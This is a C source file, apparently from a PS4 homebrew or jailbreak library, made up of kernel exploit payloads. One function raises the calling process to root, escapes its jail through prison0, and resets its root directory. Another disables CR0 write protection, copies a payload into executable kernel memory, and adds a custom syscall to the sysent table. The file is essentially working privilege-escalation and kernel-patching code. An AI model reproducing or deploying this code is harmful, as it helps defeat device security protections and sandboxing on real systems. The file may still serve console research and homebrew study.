#ifndef _KERNEL
	#define UNDEFKERNEL
	#define _KERNEL
#endif

#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/systm.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/event.h>
#include <sys/kthread.h>
#include <sys/filedesc.h>
#include <sys/ucred.h>
#include <sys/malloc.h>
#include <vm/vm.h>
#include <vm/pmap.h>
#include <vm/vm_map.h>
#include <vm/vm_extern.h>
#include <sys/sched.h>
#include <sys/sysent.h>
#include <machine/specialreg.h>

#ifdef UNDEFKERNEL
	#undef _KERNEL
#endif

#undef offsetof
#include <kernel.h>
#include <ps4/kernel.h>

#include <ps4/internal/kernel.h>
#include <ps4/internal/kernelexploit.h>
#include <ps4/internal/kernelexploitpayload.h>
#include <ps4/internal/syscallpayload.h>

static inline void ps4KernelCr0Set(uint64_t cr0) // load_cr0
{
	__asm__ volatile("movq %0, %%cr0" : : "r" (cr0));
}

static inline uint64_t ps4KernelCr0Get(void) // rcr0
{
	uint64_t cr0;
	__asm__ volatile("movq %%cr0, %0" : "=r" (cr0));
	return cr0;
}

static inline struct thread *ps4KernelCurrentThread(void)
{
	struct thread *td;
	__asm__ volatile("movq %%gs:0, %0;" : "=r"(td));
	return td;
}

// need to do some more sce patching eventually ...
int ps4KernelExploitPayloadEscalatePrivileges(int argc, char **argv)
{
	struct thread *td;
	struct ucred *cr;
	struct filedesc	*fd;
	//struct file *f;
	unsigned char *fn;
	uint16_t *sf;

	td = ps4KernelCurrentThread();

	fn = (unsigned char *)ps4KernelDlSym("bootparam_disable_console_output");
	sf = (uint16_t*)(0xffffffff00000000 | ((uint64_t)fn[7]) << 24 | ((uint64_t)fn[6]) << 16 | ((uint64_t)fn[5]) << 8 | (uint64_t)fn[4]);
	*sf = *sf & ~(1 << 15);

	cr = td->td_proc->p_ucred;
	cr->cr_uid = cr->cr_ruid = cr->cr_rgid = 0;
	//cr->cr_groups[0] = 0;
	cr->cr_prison = (struct prison *)ps4KernelDlSym("prison0");

	fd = td->td_proc->p_fd;
	//fd->fd_cdir =
	fd->fd_rdir = fd->fd_jdir = *(struct vnode **)ps4KernelDlSym("rootvnode");

	return 0;
}

#ifdef LibPS4KernelNone
	#define copyin(...)
#endif

int ps4KernelExploitPayloadInstallKernelRunSyscall(int argc, char **argv)
{
    struct sysent *sy = ps4KernelDlSym("sysent");
	unsigned long size = (unsigned long)((char *)ps4CallbackSyscallPayloadEnd - (char *)ps4CallbackSyscallPayload);
	void *addr;

	//sched_pin();
	ps4KernelCr0Set(ps4KernelCr0Get() & ~CR0_WP);
	// can't get (other) executable memory ... probably some checks Oo?
	addr =  ps4KernelExecutableMemoryMalloc(size);
	copyin((void *)ps4CallbackSyscallPayload, (void *)addr, size);
	ps4KernelCr0Set(ps4KernelCr0Get() | CR0_WP);
	//sched_unpin();

    sy = &sy[SYS_ps4_kernel_execute];
	memset(sy, 0, sizeof(*sy));
    sy->sy_narg = 3;
    sy->sy_call = (sy_call_t *)addr;
	//sy->sy_auevent = AUE_NULL;
	sy->sy_thrcnt = SY_THR_STATIC; //SY_THR_ABSENT

	return 0;
}
